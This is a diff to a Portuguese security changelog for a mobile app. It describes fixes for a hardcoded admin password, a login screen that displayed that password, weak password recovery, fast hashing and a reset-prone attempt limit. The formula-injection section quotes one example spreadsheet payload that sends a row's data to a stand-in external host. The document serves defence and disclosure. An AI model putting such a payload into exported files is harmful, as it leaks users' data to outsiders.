@@ -160,8 +160,83 @@ A senha do administrador criado na primeira execução era a constante
 `Admin@2025`, escrita no repositório, numa tabela do README e impressa na tela
 de configurações do aplicativo. O repositório é público.
 
-Corrigido: sorteada por `sortearSenhaForte`, guardada no SecureStore, exibida
-uma vez e apagável.
+A primeira correção (1.2) sorteava a senha e a guardava no SecureStore. Ela
+abriu dois problemas, descritos a seguir.
+
+### Senha do administrador na tela de entrada (1.2.x)
+
+Para a área administrativa ser alcançável numa instalação nova, a 1.2 passou
+a mostrar CPF e senha do administrador na tela de entrada, para qualquer
+pessoa que abrisse o aplicativo. O texto dizia que o aviso sumia quando a
+senha fosse trocada, mas nada apagava o aviso na troca: só o botão "Já anotei,
+remover", dentro da área administrativa. Em teste, uma pessoa sem conta entrou
+como administradora lendo a senha da tela.
+
+Corrigido em 10/11/2026: o administrador nasce **sem senha** e a tela de
+entrada oferece "Configurar administrador", em que quem instala escolhe a
+senha. Nenhuma senha é sorteada, guardada ou exibida. O botão depende do estado
+da conta, então some sozinho. Instalação que vem da 1.2.x com a senha sorteada
+ainda guardada tem essa senha tratada como vazada: a atualização a apaga e
+pede configuração nova.
+
+O que continua: num aparelho novo, quem abre primeiro configura o
+administrador. É inerente a uma conta que existe só no aparelho, sem servidor
+para dizer quem é quem.
+
+### Recuperação de senha sem segredo
+
+"Esqueci minha senha" pedia CPF e e-mail e, se batessem, deixava escolher a
+senha nova. Nenhum dos dois é segredo. Os do administrador eram públicos: o
+CPF na tela de entrada e o e-mail (`admin@conectagente.local`) no código.
+Qualquer pessoa com o aparelho na mão virava administradora, mesmo depois de
+o aviso da senha sumir. Com agente comum, bastava saber CPF e e-mail de um
+colega de unidade.
+
+Corrigido em 10/11/2026: cada conta recebe um **código de recuperação**
+(`XXXX-XXXX-XXXX`, 60 bits, alfabeto de 32 símbolos sem viés), mostrado uma
+única vez. Só o hash fica no SecureStore. A recuperação pede CPF e código,
+responde com mensagem genérica, bloqueia por 15 minutos depois de 5 erros, e
+troca o código a cada uso. Quem perdeu o código pede ao administrador, que gera
+um novo na tela de agentes sem ver nem definir a senha do agente.
+
+A troca pela recuperação vale para entrar no aparelho. A senha da conta no
+Supabase Auth, usada pela sincronização, muda junto quando o aparelho ainda tem
+uma sessão aberta da mesma pessoa (`updateUser`). Sem sessão não há como provar
+ao servidor quem é quem: a conta usa e-mail interno, sem "esqueci a senha" do
+lado de lá. Nesse caso o aparelho marca a pendência, o login avisa que a
+sincronização está parada, e a coordenação redefine a senha de sincronização no
+painel (`redefinirSenhaDeAcesso`). Só para baixo na hierarquia: gerente redefine
+agente e coordenador; admin redefine também gerente; ninguém redefine a si
+mesmo nem um par. A ação fica na trilha de auditoria, sem a senha.
+
+O administrador que perde a senha e o código não tem acima dele quem gere um
+código novo. A tela de entrada oferece reiniciar o aparelho sem reinstalar:
+mostra quantos registros ainda não foram para o servidor, pede que cada agente
+sincronize antes, e exige digitar `APAGAR`. Apaga tudo junto, e não só a conta
+do administrador: voltar só ela para "sem senha" deixaria qualquer pessoa com o
+aparelho entrar como administradora.
+
+### Hash de senha rápido demais
+
+A senha era guardada como `sha256(sal + senha)`, uma passada só. O sal impede
+tabela pronta, mas um computador comum faz bilhões de SHA-256 por segundo: com
+o banco em mãos, uma senha de 8 caracteres caía em minutos.
+
+Corrigido em 10/11/2026: PBKDF2-HMAC-SHA256 com 100 mil iterações e sal de 16
+bytes, pela `@noble/hashes` (auditada, sem dependências). O número foi medido:
+150 ms no Node desta máquina, perto de um segundo no celular, que roda
+JavaScript no Hermes sem compilação. O OWASP pede 600 mil para servidor; no
+aparelho seriam vários segundos por login. O banco já é cifrado com SQLCipher,
+então o hash é a segunda camada. As iterações vão dentro do hash, e quem entra
+com hash antigo (SHA-256 com ou sem sal, ou menos iterações) é regravado no
+login.
+
+### Limite de tentativas que zerava ao reabrir
+
+A contagem de tentativas erradas ficava só na memória. Fechar e abrir o
+aplicativo dava mais cinco tentativas, sem espera. Corrigido em 10/11/2026: a
+contagem vai para o armazenamento do aplicativo e sobrevive ao reinício. Vale
+para o login e para a recuperação de senha.
 
 ### Injeção de fórmula em planilha
 
@@ -172,7 +247,10 @@ digitado em campo.
 
 Uma célula com `=HYPERLINK("http://fora.example/"&A1,"clique")` exfiltraria a
 linha quando alguém da secretaria abrisse o arquivo. Corrigido no aplicativo e
-no painel, com prefixo de apóstrofo, que a planilha trata como texto.
+no painel. No CSV, com prefixo de apóstrofo. No .xlsx, desde 10/11/2026, cada
+célula é gravada com o tipo texto declarado, que o Excel não interpreta como
+fórmula; o apóstrofo aplicado ali aparecia escrito na célula, e todo campo
+vazio saía como `'-`.
 
 ### Vulnerabilidade crítica no framework
 
